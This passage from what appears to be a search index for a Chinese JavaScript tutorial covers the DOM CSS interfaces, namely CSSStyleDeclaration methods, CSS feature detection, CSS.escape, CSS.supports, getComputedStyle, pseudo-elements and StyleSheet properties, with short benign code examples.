\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u4e14\u53ea\u5728\u4f7f\u7528 CSSRule \u63a5\u53e3\u65f6\u6709\u610f\u4e49\u3002 1 2 3 var declaration = document . styleSheets [ 0 ]. rules [ 0 ]. style ; declaration . parentRule === document . styleSheets [ 0 ]. rules [ 0 ] // true","title":"CSSStyleDeclaration \u5b9e\u4f8b\u5c5e\u6027"},{"location":"dom/css/#cssstyledeclaration_2","text":"\uff081\uff09CSSStyleDeclaration.getPropertyPriority() CSSStyleDeclaration.getPropertyPriority \u65b9\u6cd5\u63a5\u53d7 CSS \u6837\u5f0f\u7684\u5c5e\u6027\u540d\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u6709\u6ca1\u6709\u8bbe\u7f6e important \u4f18\u5148\u7ea7\u3002\u5982\u679c\u6709\u5c31\u8fd4\u56de important \uff0c\u5426\u5219\u8fd4\u56de\u7a7a\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u4e3a // <div id=\"myDiv\" style=\"margin: 10px!important; color: red;\"/> var style = document . getElementById ( 'myDiv' ). style ; style . margin // \"10px\" style . getPropertyPriority ( 'margin' ) // \"important\" style . getPropertyPriority ( 'color' ) // \"\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c margin \u5c5e\u6027\u6709 important \u4f18\u5148\u7ea7\uff0c color \u5c5e\u6027\u6ca1\u6709\u3002 \uff082\uff09CSSStyleDeclaration.getPropertyValue() CSSStyleDeclaration.getPropertyValue \u65b9\u6cd5\u63a5\u53d7 CSS \u6837\u5f0f\u5c5e\u6027\u540d\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\uff0c\u8868\u793a\u8be5\u5c5e\u6027\u7684\u5c5e\u6027\u503c\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <div id=\"myDiv\" style=\"margin: 10px!important; color: red;\"/> var style = document . getElementById ( 'myDiv' ). style ; style . margin // \"10px\" style . getPropertyValue ( \"margin\" ) // \"10px\" \uff083\uff09CSSStyleDeclaration.item() CSSStyleDeclaration.item \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u6574\u6570\u503c\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u8be5\u4f4d\u7f6e\u7684 CSS \u5c5e\u6027\u540d\u3002 1 2 3 4 5 // HTML \u4ee3\u7801\u4e3a // <div id=\"myDiv\" style=\"color: red; background-color: white;\"/> var style = document . getElementById ( 'myDiv' ). style ; style . item ( 0 ) // \"color\" style . item ( 1 ) // \"background-color\" \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c 0 \u53f7\u4f4d\u7f6e\u7684 CSS \u5c5e\u6027\u540d\u662f color \uff0c 1 \u53f7\u4f4d\u7f6e\u7684 CSS \u5c5e\u6027\u540d\u662f background-color \u3002 \u5982\u679c\u6ca1\u6709\u63d0\u4f9b\u53c2\u6570\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u4f1a\u62a5\u9519\u3002\u5982\u679c\u53c2\u6570\u503c\u8d85\u8fc7\u5b9e\u9645\u7684\u5c5e\u6027\u6570\u76ee\uff0c\u8fd9\u4e2a\u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u7b26\u503c\u3002 \uff084\uff09CSSStyleDeclaration.removeProperty() CSSStyleDeclaration.removeProperty \u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u5c5e\u6027\u540d\u4f5c\u4e3a\u53c2\u6570\uff0c\u5728 CSS \u89c4\u5219\u91cc\u9762\u79fb\u9664\u8fd9\u4e2a\u5c5e\u6027\uff0c\u8fd4\u56de\u8fd9\u4e2a\u5c5e\u6027\u539f\u6765\u7684\u503c\u3002 1 2 3 4 5 6 7 8 // HTML \u4ee3\u7801\u4e3a // <div id=\"myDiv\" style=\"color: red; background-color: white;\"> // 111 // </div> var style = document . getElementById ( 'myDiv' ). style ; style . removeProperty ( 'color' ) // 'red' // HTML \u4ee3\u7801\u53d8\u4e3a // <div id=\"myDiv\" style=\"background-color: white;\"> \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5220\u9664 color \u5c5e\u6027\u4ee5\u540e\uff0c\u5b57\u4f53\u989c\u8272\u4ece\u7ea2\u8272\u53d8\u6210\u9ed8\u8ba4\u989c\u8272\u3002 \uff085\uff09CSSStyleDeclaration.setProperty() CSSStyleDeclaration.setProperty \u65b9\u6cd5\u7528\u6765\u8bbe\u7f6e\u65b0\u7684 CSS \u5c5e\u6027\u3002\u8be5\u65b9\u6cd5\u6ca1\u6709\u8fd4\u56de\u503c\u3002 \u8be5\u65b9\u6cd5\u53ef\u4ee5\u63a5\u53d7\u4e09\u4e2a\u53c2\u6570\u3002 \u7b2c\u4e00\u4e2a\u53c2\u6570\uff1a\u5c5e\u6027\u540d\uff0c\u8be5\u53c2\u6570\u662f\u5fc5\u9700\u7684\u3002 \u7b2c\u4e8c\u4e2a\u53c2\u6570\uff1a\u5c5e\u6027\u503c\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u5982\u679c\u7701\u7565\uff0c\u5219\u53c2\u6570\u503c\u9ed8\u8ba4\u4e3a\u7a7a\u5b57\u7b26\u4e32\u3002 \u7b2c\u4e09\u4e2a\u53c2\u6570\uff1a\u4f18\u5148\u7ea7\uff0c\u8be5\u53c2\u6570\u53ef\u9009\u3002\u5982\u679c\u8bbe\u7f6e\uff0c\u552f\u4e00\u7684\u5408\u6cd5\u503c\u662f important \uff0c\u8868\u793a CSS \u89c4\u5219\u91cc\u9762\u7684 !important \u3002 1 2 3 4 5 6 // HTML \u4ee3\u7801\u4e3a // <div id=\"myDiv\" style=\"color: red; background-color: white;\"> // 111 // </div> var style = document . getElementById ( 'myDiv' ). style ; style . setProperty ( 'border' , '1px solid blue' ); \u4e0a\u9762\u4ee3\u7801\u6267\u884c\u540e\uff0c myDiv \u5143\u7d20\u5c31\u4f1a\u51fa\u73b0\u84dd\u8272\u7684\u8fb9\u6846\u3002","title":"CSSStyleDeclaration \u5b9e\u4f8b\u65b9\u6cd5"},{"location":"dom/css/#css_1","text":"CSS \u7684\u89c4\u683c\u53d1\u5c55\u592a\u5feb\uff0c\u65b0\u7684\u6a21\u5757\u5c42\u51fa\u4e0d\u7a77\u3002\u4e0d\u540c\u6d4f\u89c8\u5668\u7684\u4e0d\u540c\u7248\u672c\uff0c\u5bf9 CSS \u6a21\u5757\u7684\u652f\u6301\u60c5\u51b5\u90fd\u4e0d\u4e00\u6837\u3002\u6709\u65f6\u5019\uff0c\u9700\u8981\u77e5\u9053\u5f53\u524d\u6d4f\u89c8\u5668\u662f\u5426\u652f\u6301\u67d0\u4e2a\u6a21\u5757\uff0c\u8fd9\u5c31\u53eb\u505a\u201cCSS\u6a21\u5757\u7684\u4fa6\u6d4b\u201d\u3002 \u4e00\u4e2a\u6bd4\u8f83\u666e\u904d\u9002\u7528\u7684\u65b9\u6cd5\u662f\uff0c\u5224\u65ad\u5143\u7d20\u7684 style \u5bf9\u8c61\u7684\u67d0\u4e2a\u5c5e\u6027\u503c\u662f\u5426\u4e3a\u5b57\u7b26\u4e32\u3002 1 2 typeof element . style . animationName === 'string' ; typeof element . style . transform === 'string' ; \u5982\u679c\u8be5 CSS \u5c5e\u6027\u786e\u5b9e\u5b58\u5728\uff0c\u4f1a\u8fd4\u56de\u4e00\u4e2a\u5b57\u7b26\u4e32\u3002\u5373\u4f7f\u8be5\u5c5e\u6027\u5b9e\u9645\u4e0a\u5e76\u672a\u8bbe\u7f6e\uff0c\u4e5f\u4f1a\u8fd4\u56de\u4e00\u4e2a\u7a7a\u5b57\u7b26\u4e32\u3002\u5982\u679c\u8be5\u5c5e\u6027\u4e0d\u5b58\u5728\uff0c\u5219\u4f1a\u8fd4\u56de undefined \u3002 1 2 document . body . style [ 'maxWidth' ] // \"\" document . body . style [ 'maximumWidth' ] // undefined \u4e0a\u9762\u4ee3\u7801\u8bf4\u660e\uff0c\u8fd9\u4e2a\u6d4f\u89c8\u5668\u652f\u6301 max-width \u5c5e\u6027\uff0c\u4f46\u662f\u4e0d\u652f\u6301 maximum-width \u5c5e\u6027\u3002 \u6ce8\u610f\uff0c\u4e0d\u7ba1 CSS \u5c5e\u6027\u540d\u7684\u5199\u6cd5\u5e26\u4e0d\u5e26\u8fde\u8bcd\u7ebf\uff0c style \u5c5e\u6027\u4e0a\u90fd\u80fd\u53cd\u6620\u51fa\u8be5\u5c5e\u6027\u662f\u5426\u5b58\u5728\u3002 1 2 document . body . style [ 'backgroundColor' ] // \"\" document . body . style [ 'background-color' ] // \"\" \u53e6\u5916\uff0c\u4f7f\u7528\u7684\u65f6\u5019\uff0c\u9700\u8981\u628a\u4e0d\u540c\u6d4f\u89c8\u5668\u7684 CSS \u524d\u7f00\u4e5f\u8003\u8651\u8fdb\u53bb\u3002 1 2 var content = document . getElementById ( 'content' ); typeof content . style [ 'webkitAnimation' ] === 'string' \u8fd9\u79cd\u4fa6\u6d4b\u65b9\u6cd5\u53ef\u4ee5\u5199\u6210\u4e00\u4e2a\u51fd\u6570\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 function isPropertySupported ( property ) { if ( property in document . body . style ) return true ; var prefixes = [ 'Moz' , 'Webkit' , 'O' , 'ms' , 'Khtml' ]; var prefProperty = property . charAt ( 0 ). toUpperCase () + property . substr ( 1 ); for ( var i = 0 ; i < prefixes . length ; i ++ ){ if (( prefixes [ i ] + prefProperty ) in document . body . style ) return true ; } return false ; } isPropertySupported ( 'background-clip' ) // true","title":"CSS \u6a21\u5757\u7684\u4fa6\u6d4b"},{"location":"dom/css/#css_2","text":"\u6d4f\u89c8\u5668\u539f\u751f\u63d0\u4f9b CSS \u5bf9\u8c61\uff0c\u4e3a JavaScript \u64cd\u4f5c CSS \u63d0\u4f9b\u4e00\u4e9b\u5de5\u5177\u65b9\u6cd5\u3002 \u8fd9\u4e2a\u5bf9\u8c61\u76ee\u524d\u6709\u4e24\u4e2a\u9759\u6001\u65b9\u6cd5\u3002","title":"CSS \u5bf9\u8c61"},{"location":"dom/css/#cssescape","text":"CSS.escape \u65b9\u6cd5\u7528\u4e8e\u8f6c\u4e49 CSS \u9009\u62e9\u5668\u91cc\u9762\u7684\u7279\u6b8a\u5b57\u7b26\u3002 1 < div id = \"foo#bar\" > \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u8be5\u5143\u7d20\u7684 id \u5c5e\u6027\u5305\u542b\u4e00\u4e2a # \u53f7\uff0c\u8be5\u5b57\u7b26\u5728 CSS \u9009\u62e9\u5668\u91cc\u9762\u6709\u7279\u6b8a\u542b\u4e49\u3002\u4e0d\u80fd\u76f4\u63a5\u5199\u6210 document.querySelector('#foo#bar') \uff0c\u53ea\u80fd\u5199\u6210 document.querySelector('#foo\\\\#bar') \u3002\u8fd9\u91cc\u5fc5\u987b\u4f7f\u7528\u53cc\u659c\u6760\u7684\u539f\u56e0\u662f\uff0c\u5355\u5f15\u53f7\u5b57\u7b26\u4e32\u672c\u8eab\u4f1a\u8f6c\u4e49\u4e00\u6b21\u659c\u6760\u3002 CSS.escape \u65b9\u6cd5\u5c31\u7528\u6765\u8f6c\u4e49\u90a3\u4e9b\u7279\u6b8a\u5b57\u7b26\u3002 1 document . querySelector ( '#' + CSS . escape ( 'foo#bar' ))","title":"CSS.escape()"},{"location":"dom/css/#csssupports","text":"CSS.supports \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u5f53\u524d\u73af\u5883\u662f\u5426\u652f\u6301\u67d0\u4e00\u53e5 CSS \u89c4\u5219\u3002 \u5b83\u7684\u53c2\u6570\u6709\u4e24\u79cd\u5199\u6cd5\uff0c\u4e00\u79cd\u662f\u7b2c\u4e00\u4e2a\u53c2\u6570\u662f\u5c5e\u6027\u540d\uff0c\u7b2c\u4e8c\u4e2a\u53c2\u6570\u662f\u5c5e\u6027\u503c\uff1b\u53e6\u4e00\u79cd\u662f\u6574\u4e2a\u53c2\u6570\u5c31\u662f\u4e00\u884c\u5b8c\u6574\u7684 CSS \u8bed\u53e5\u3002 1 2 3 4 5 // \u7b2c\u4e00\u79cd\u5199\u6cd5 CSS . supports ( 'transform-origin' , '5px' ) // true // \u7b2c\u4e8c\u79cd\u5199\u6cd5 CSS . supports ( 'display: table-cell' ) // true \u6ce8\u610f\uff0c\u7b2c\u4e8c\u79cd\u5199\u6cd5\u7684\u53c2\u6570\u7ed3\u5c3e\u4e0d\u80fd\u5e26\u6709\u5206\u53f7\uff0c\u5426\u5219\u7ed3\u679c\u4e0d\u51c6\u786e\u3002 1 CSS . supports ( 'display: table-cell;' ) // false","title":"CSS.supports()"},{"location":"dom/css/#windowgetcomputedstyle","text":"\u884c\u5185\u6837\u5f0f\uff08inline style\uff09\u5177\u6709\u6700\u9ad8\u7684\u4f18\u5148\u7ea7\uff0c\u6539\u53d8\u884c\u5185\u6837\u5f0f\uff0c\u901a\u5e38\u4f1a\u7acb\u5373\u53cd\u6620\u51fa\u6765\u3002\u4f46\u662f\uff0c\u7f51\u9875\u5143\u7d20\u6700\u7ec8\u7684\u6837\u5f0f\u662f\u7efc\u5408\u5404\u79cd\u89c4\u5219\u8ba1\u7b97\u51fa\u6765\u7684\u3002\u56e0\u6b64\uff0c\u5982\u679c\u60f3\u5f97\u5230\u5143\u7d20\u5b9e\u9645\u7684\u6837\u5f0f\uff0c\u53ea\u8bfb\u53d6\u884c\u5185\u6837\u5f0f\u662f\u4e0d\u591f\u7684\uff0c\u9700\u8981\u5f97\u5230\u6d4f\u89c8\u5668\u6700\u7ec8\u8ba1\u7b97\u51fa\u6765\u7684\u6837\u5f0f\u89c4\u5219\u3002 window.getComputedStyle \u65b9\u6cd5\uff0c\u5c31\u7528\u6765\u8fd4\u56de\u6d4f\u89c8\u5668\u8ba1\u7b97\u540e\u5f97\u5230\u7684\u6700\u7ec8\u89c4\u5219\u3002\u5b83\u63a5\u53d7\u4e00\u4e2a\u8282\u70b9\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u8fd4\u56de\u4e00\u4e2a CSSStyleDeclaration \u5b9e\u4f8b\uff0c\u5305\u542b\u4e86\u6307\u5b9a\u8282\u70b9\u7684\u6700\u7ec8\u6837\u5f0f\u4fe1\u606f\u3002\u6240\u8c13\u201c\u6700\u7ec8\u6837\u5f0f\u4fe1\u606f\u201d\uff0c\u6307\u7684\u662f\u5404\u79cd CSS \u89c4\u5219\u53e0\u52a0\u540e\u7684\u7ed3\u679c\u3002 1 2 3 var div = document . querySelector ( 'div' ); var styleObj = window . getComputedStyle ( div ); styleObj . backgroundColor \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c\u5f97\u5230\u7684\u80cc\u666f\u8272\u5c31\u662f div \u5143\u7d20\u771f\u6b63\u7684\u80cc\u666f\u8272\u3002 \u6ce8\u610f\uff0cCSSStyleDeclaration \u5b9e\u4f8b\u662f\u4e00\u4e2a\u6d3b\u7684\u5bf9\u8c61\uff0c\u4efb\u4f55\u5bf9\u4e8e\u6837\u5f0f\u7684\u4fee\u6539\uff0c\u4f1a\u5b9e\u65f6\u53cd\u6620\u5230\u8fd9\u4e2a\u5b9e\u4f8b\u4e0a\u9762\u3002\u53e6\u5916\uff0c\u8fd9\u4e2a\u5b9e\u4f8b\u662f\u53ea\u8bfb\u7684\u3002 getComputedStyle \u65b9\u6cd5\u8fd8\u53ef\u4ee5\u63a5\u53d7\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u8868\u793a\u5f53\u524d\u5143\u7d20\u7684\u4f2a\u5143\u7d20\uff08\u6bd4\u5982 :before \u3001 :after \u3001 :first-line \u3001 :first-letter \u7b49\uff09\u3002 1 var result = window . getComputedStyle ( div , ':before' ); \u4e0b\u9762\u7684\u4f8b\u5b50\u662f\u5982\u4f55\u83b7\u53d6\u5143\u7d20\u7684\u9ad8\u5ea6\u3002 1 2 3 4 5 6 var elem = document . getElementById ( 'elem-container' ); var styleObj = window . getComputedStyle ( elem , null ) var height = styleObj . height ; // \u7b49\u540c\u4e8e var height = styleObj [ 'height' ]; var height = styleObj . getPropertyValue ( 'height' ); \u4e0a\u9762\u4ee3\u7801\u5f97\u5230\u7684 height \u5c5e\u6027\uff0c\u662f\u6d4f\u89c8\u5668\u6700\u7ec8\u6e32\u67d3\u51fa\u6765\u7684\u9ad8\u5ea6\uff0c\u6bd4\u5176\u4ed6\u65b9\u6cd5\u5f97\u5230\u7684\u9ad8\u5ea6\u66f4\u53ef\u9760\u3002\u7531\u4e8e styleObj \u662f CSSStyleDeclaration \u5b9e\u4f8b\uff0c\u6240\u4ee5\u53ef\u4ee5\u4f7f\u7528\u5404\u79cd CSSStyleDeclaration \u7684\u5b9e\u4f8b\u5c5e\u6027\u548c\u65b9\u6cd5\u3002 \u6709\u51e0\u70b9\u9700\u8981\u6ce8\u610f\u3002 CSSStyleDeclaration \u5b9e\u4f8b\u8fd4\u56de\u7684 CSS \u503c\u90fd\u662f\u7edd\u5bf9\u5355\u4f4d\u3002\u6bd4\u5982\uff0c\u957f\u5ea6\u90fd\u662f\u50cf\u7d20\u5355\u4f4d\uff08\u8fd4\u56de\u503c\u5305\u62ec px \u540e\u7f00\uff09\uff0c\u989c\u8272\u662f rgb(#, #, #) \u6216 rgba(#, #, #, #) \u683c\u5f0f\u3002 CSS \u89c4\u5219\u7684\u7b80\u5199\u5f62\u5f0f\u65e0\u6548\u3002\u6bd4\u5982\uff0c\u60f3\u8bfb\u53d6 margin \u5c5e\u6027\u7684\u503c\uff0c\u4e0d\u80fd\u76f4\u63a5\u8bfb\uff0c\u53ea\u80fd\u8bfb marginLeft \u3001 marginTop \u7b49\u5c5e\u6027\uff1b\u518d\u6bd4\u5982\uff0c font \u5c5e\u6027\u4e5f\u662f\u4e0d\u80fd\u76f4\u63a5\u8bfb\u7684\uff0c\u53ea\u80fd\u8bfb font-size \u7b49\u5355\u4e2a\u5c5e\u6027\u3002 \u5982\u679c\u8bfb\u53d6 CSS \u539f\u59cb\u7684\u5c5e\u6027\u540d\uff0c\u8981\u7528\u65b9\u62ec\u53f7\u8fd0\u7b97\u7b26\uff0c\u6bd4\u5982 styleObj['z-index'] \uff1b\u5982\u679c\u8bfb\u53d6\u9a86\u9a7c\u62fc\u5199\u6cd5\u7684 CSS \u5c5e\u6027\u540d\uff0c\u53ef\u4ee5\u76f4\u63a5\u8bfb\u53d6 styleObj.zIndex \u3002 \u8be5\u65b9\u6cd5\u8fd4\u56de\u7684 CSSStyleDeclaration \u5b9e\u4f8b\u7684 cssText \u5c5e\u6027\u65e0\u6548\uff0c\u8fd4\u56de undefined \u3002","title":"window.getComputedStyle()"},{"location":"dom/css/#css_3","text":"CSS \u4f2a\u5143\u7d20\u662f\u901a\u8fc7 CSS \u5411 DOM \u6dfb\u52a0\u7684\u5143\u7d20\uff0c\u4e3b\u8981\u662f\u901a\u8fc7 :before \u548c :after \u9009\u62e9\u5668\u751f\u6210\uff0c\u7136\u540e\u7528 content \u5c5e\u6027\u6307\u5b9a\u4f2a\u5143\u7d20\u7684\u5185\u5bb9\u3002 \u4e0b\u9762\u662f\u4e00\u6bb5 HTML \u4ee3\u7801\u3002 1 < div id = \"test\" > Test content </ div > CSS \u6dfb\u52a0\u4f2a\u5143\u7d20 :before \u7684\u5199\u6cd5\u5982\u4e0b\u3002 1 2 3 4 # test : before { content : 'Before ' ; color : #FF0 ; } \u8282\u70b9\u5143\u7d20\u7684 style \u5bf9\u8c61\u65e0\u6cd5\u8bfb\u5199\u4f2a\u5143\u7d20\u7684\u6837\u5f0f\uff0c\u8fd9\u65f6\u5c31\u8981\u7528\u5230 window.getComputedStyle() \u3002JavaScript \u83b7\u53d6\u4f2a\u5143\u7d20\uff0c\u53ef\u4ee5\u4f7f\u7528\u4e0b\u9762\u7684\u65b9\u6cd5\u3002 1 2 3 4 var test = document . querySelector ( '#test' ); var result = window . getComputedStyle ( test , ':before' ). content ; var color = window . getComputedStyle ( test , ':before' ). color ; \u6b64\u5916\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 CSSStyleDeclaration \u5b9e\u4f8b\u7684 getPropertyValue \u65b9\u6cd5\uff0c\u83b7\u53d6\u4f2a\u5143\u7d20\u7684\u5c5e\u6027\u3002 1 2 3 4 var result = window . getComputedStyle ( test , ':before' ) . getPropertyValue ( 'content' ); var color = window . getComputedStyle ( test , ':before' ) . getPropertyValue ( 'color' );","title":"CSS \u4f2a\u5143\u7d20"},{"location":"dom/css/#stylesheet","text":"","title":"StyleSheet \u63a5\u53e3"},{"location":"dom/css/#_2","text":"StyleSheet \u63a5\u53e3\u4ee3\u8868\u7f51\u9875\u7684\u4e00\u5f20\u6837\u5f0f\u8868\uff0c\u5305\u62ec <link> \u5143\u7d20\u52a0\u8f7d\u7684\u6837\u5f0f\u8868\u548c <style> \u5143\u7d20\u5185\u5d4c\u7684\u6837\u5f0f\u8868\u3002 document \u5bf9\u8c61\u7684 styleSheets \u5c5e\u6027\uff0c\u53ef\u4ee5\u8fd4\u56de\u5f53\u524d\u9875\u9762\u7684\u6240\u6709 StyleSheet \u5b9e\u4f8b\uff08\u5373\u6240\u6709\u6837\u5f0f\u8868\uff09\u3002\u5b83\u662f\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\u3002 1 2 3 var sheets = document . styleSheets ; var sheet = document . styleSheets [ 0 ]; sheet instanceof StyleSheet // true \u5982\u679c\u662f <style> \u5143\u7d20\u5d4c\u5165\u7684\u6837\u5f0f\u8868\uff0c\u8fd8\u6709\u53e6\u4e00\u79cd\u83b7\u53d6 StyleSheet \u5b9e\u4f8b\u7684\u65b9\u6cd5\uff0c\u5c31\u662f\u8fd9\u4e2a\u8282\u70b9\u5143\u7d20\u7684 sheet \u5c5e\u6027\u3002 1 2 3 // HTML \u4ee3\u7801\u4e3a <style id=\"myStyle\"></style> var myStyleSheet = document . getElementById ( 'myStyle' ). sheet ; myStyleSheet instanceof StyleSheet // true \u4e25\u683c\u5730\u8bf4\uff0c StyleSheet \u63a5\u53e3\u4e0d\u4ec5\u5305\u62ec\u7f51\u9875\u6837\u5f0f\u8868\uff0c\u8fd8\u5305\u62ec XML \u6587\u6863\u7684\u6837\u5f0f\u8868\u3002\u6240\u4ee5\uff0c\u5b83\u6709\u4e00\u4e2a\u5b50\u7c7b CSSStyleSheet \u8868\u793a\u7f51\u9875\u7684 CSS \u6837\u5f0f\u8868\u3002\u6211\u4eec\u5728\u7f51\u9875\u91cc\u9762\u62ff\u5230\u7684\u6837\u5f0f\u8868\u5b9e\u4f8b\uff0c\u5b9e\u9645\u4e0a\u662f CSSStyleSheet \u7684\u5b9e\u4f8b\u3002\u8fd9\u4e2a\u5b50\u63a5\u53e3\u7ee7\u627f\u4e86 StyleSheet \u7684\u6240\u6709\u5c5e\u6027\u548c\u65b9\u6cd5\uff0c\u5e76\u4e14\u5b9a\u4e49\u4e86\u51e0\u4e2a\u81ea\u5df1\u7684\u5c5e\u6027\uff0c\u4e0b\u9762\u628a\u8fd9\u4e24\u4e2a\u63a5\u53e3\u653e\u5728\u4e00\u8d77\u4ecb\u7ecd\u3002","title":"\u6982\u8ff0"},{"location":"dom/css/#_3","text":"StyleSheet \u5b9e\u4f8b\u6709\u4ee5\u4e0b\u5c5e\u6027\u3002 \uff081\uff09StyleSheet.disabled StyleSheet.disabled \u8fd4\u56de\u4e00\u4e2a\u5e03\u5c14\u503c\uff0c\u8868\u793a\u8be5\u6837\u5f0f\u8868\u662f\u5426\u5904\u4e8e\u7981\u7528\u72b6\u6001\u3002\u624b\u52a8\u8bbe\u7f6e disabled \u5c5e\u6027\u4e3a true \uff0c\u7b49\u540c\u4e8e\u5728 <link> \u5143\u7d20\u91cc\u9762\uff0c\u5c06\u8fd9\u5f20\u6837\u5f0f\u8868\u8bbe\u4e3a alternate stylesheet \uff0c\u5373\u8be5\u6837\u5f0f\u8868\u5c06\u4e0d\u4f1a\u751f\u6548\u3002 \u6ce8\u610f\uff0c disabled \u5c5e\u6027\u53ea\u80fd\u5728 JavaScript \u811a\u672c\u4e2d\u8bbe\u7f6e\uff0c\u4e0d\u80fd\u5728 HTML \u8bed\u53e5\u4e2d\u8bbe\u7f6e\u3002 \uff082\uff09Stylesheet.href Stylesheet.href \u8fd4\u56de\u6837\u5f0f\u8868\u7684\u7f51\u5740\u3002\u5bf9\u4e8e\u5185\u5d4c\u6837\u5f0f\u8868\uff0c\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\u3002 1 document . styleSheets [ 0 ]. href \uff083\uff09StyleSheet.media StyleSheet.media \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08 MediaList \u5b9e\u4f8b\uff09\uff0c\u6210\u5458\u662f\u8868\u793a\u9002\u7528\u5a92\u4ecb\u7684\u5b57\u7b26\u4e32\u3002\u8868\u793a\u5f53\u524d\u6837\u5f0f\u8868\u662f\u7528\u4e8e\u5c4f\u5e55\uff08screen\uff09\uff0c\u8fd8\u662f\u7528\u4e8e\u6253\u5370\uff08print\uff09\u6216\u624b\u6301\u8bbe\u5907\uff08handheld\uff09\uff0c\u6216\u5404\u79cd\u5a92\u4ecb\u90fd\u9002\u7528\uff08all\uff09\u3002\u8be5\u5c5e\u6027\u53ea\u8bfb\uff0c\u9ed8\u8ba4\u503c\u662f screen \u3002 1 2 document . styleSheets [ 0 ]. media . mediaText // \"all\" MediaList \u5b9e\u4f8b\u7684 appendMedium \u65b9\u6cd5\uff0c\u7528\u4e8e\u589e\u52a0\u5a92\u4ecb\uff1b deleteMedium \u65b9\u6cd5\u7528\u4e8e\u5220\u9664\u5a92\u4ecb\u3002 1 2 document . styleSheets [ 0 ]. media . appendMedium ( 'handheld' ); document . styleSheets [ 0 ]. media . deleteMedium ( 'print' ); \uff084\uff09StyleSheet.title StyleSheet.title \u5c5e\u6027\u8fd4\u56de\u6837\u5f0f\u8868\u7684 title \u5c5e\u6027\u3002 \uff085\uff09StyleSheet.type StyleSheet.type \u5c5e\u6027\u8fd4\u56de\u6837\u5f0f\u8868\u7684 type \u5c5e\u6027\uff0c\u901a\u5e38\u662f text/css \u3002 1 document . styleSheets [ 0 ]. type // \"text/css\" \uff086\uff09StyleSheet.parentStyleSheet CSS \u7684 @import \u547d\u4ee4\u5141\u8bb8\u5728\u6837\u5f0f\u8868\u4e2d\u52a0\u8f7d\u5176\u4ed6\u6837\u5f0f\u8868\u3002 StyleSheet.parentStyleSheet \u5c5e\u6027\u8fd4\u56de\u5305\u542b\u4e86\u5f53\u524d\u6837\u5f0f\u8868\u7684\u90a3\u5f20\u6837\u5f0f\u8868\u3002\u5982\u679c\u5f53\u524d\u6837\u5f0f\u8868\u662f\u9876\u5c42\u6837\u5f0f\u8868\uff0c\u5219\u8be5\u5c5e\u6027\u8fd4\u56de null \u3002 1 2 3 4 5 if ( stylesheet . parentStyleSheet ) { sheet = stylesheet . parentStyleSheet ; } else { sheet = stylesheet ; } \uff087\uff09StyleSheet.ownerNode StyleSheet.ownerNode \u5c5e\u6027\u8fd4\u56de StyleSheet \u5bf9\u8c61\u6240\u5728\u7684 DOM \u8282\u70b9\uff0c\u901a\u5e38\u662f <link> \u6216 <style> \u3002\u5bf9\u4e8e\u90a3\u4e9b\u7531\u5176\u4ed6\u6837\u5f0f\u8868\u5f15\u7528\u7684\u6837\u5f0f\u8868\uff0c\u8be5\u5c5e\u6027\u4e3a null \u3002 1 2 3 // HTML\u4ee3\u7801\u4e3a // <link rel=\"StyleSheet\" href=\"example.css\" type=\"text/css\" /> document . styleSheets [ 0 ]. ownerNode // [object HTMLLinkElement] \uff088\uff09CSSStyleSheet.cssRules CSSStyleSheet.cssRules \u5c5e\u6027\u6307\u5411\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff08 CSSRuleList \u5b9e\u4f8b\uff09\uff0c\u91cc\u9762\u6bcf\u4e00\u4e2a\u6210\u5458\u5c31\u662f\u5f53\u524d\u6837\u5f0f\u8868\u7684\u4e00\u6761 CSS \u89c4\u5219\u3002\u4f7f\u7528\u8be5\u89c4\u5219\u7684 cssText \u5c5e\u6027\uff0c\u53ef\u4ee5\u5f97\u5230 CSS \u89c4\u5219\u5bf9\u5e94\u7684\u5b57\u7b26\u4e32\u3002 1 2 3 4 5 6 7 var sheet = document . querySelector ( '#styleElement' ). sheet ; sheet . cssRules [ 0 ]. cssText // \"body { background-color: red; margin: 20px; }\" sheet . cssRules [ 1 ]. cssText // \"p { line-height: 1.4em; color: blue; }\" \u6bcf\u6761 CSS \u89c4\u5219\u8fd8\u6709\u4e00\u4e2a style \u5c5e\u6027\uff0c\u6307\u5411\u4e00\u4e2a\u5bf9\u8c61\uff0c\u7528\u6765\u8bfb\u5199\u5177\u4f53\u7684 CSS \u547d\u4ee4\u3002 1 2 cssStyleSheet . cssRules [ 0 ]. style . color = 'red' ; cssStyleSheet . cssRules [ 1 ]. style . color = 'purple' ; \uff089\uff09CSSStyleSheet.ownerRule \u6709\u4e9b\u6837\u5f0f\u8868\u662f\u901a\u8fc7 @import \u89c4\u5219\u8f93\u5165\u7684\uff0c\u5b83\u7684 ownerRule \u5c5e\u6027\u4f1a\u8fd4\u56de\u4e00\u4e2a CSSRule 